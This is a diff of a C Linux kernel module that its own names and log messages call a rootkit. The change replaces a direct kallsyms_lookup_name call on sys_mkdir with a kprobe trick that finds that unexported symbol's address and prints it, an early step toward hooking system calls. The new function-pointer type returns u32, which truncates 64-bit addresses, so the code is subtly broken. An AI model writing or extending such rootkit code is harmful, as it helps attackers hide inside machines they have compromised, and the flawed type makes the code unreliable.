@@ -2,16 +2,25 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/types.h>
+#include <linux/kprobes.h>
 
-u64 target_addr;
+typedef u32 (*kallsyms_lookup_name_t)(const char *name);
+kallsyms_lookup_name_t kallsyms_lookup_name_fn = NULL;
 
 int init_rootkit(void)
 {
     printk("[rootkit] - Hello\n");
 
-    target_addr = kallsyms_lookup_name(SYSCALL_NAME("sys_mkdir"));
-    printk("[rootkit] - target_addr = 0x%llX", target_addr);
+    struct kprobe kp = {
+        .symbol_name = "kallsyms_lookup_name"
+    };
 
+    register_kprobe(&kp);
+    kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
+    unregister_kprobe(&kp);
+
+    printk("[rootkit] kallsyms_lookup_name = %p\n", kallsyms_lookup_name_fn);
+    
     return 0;
 }
 
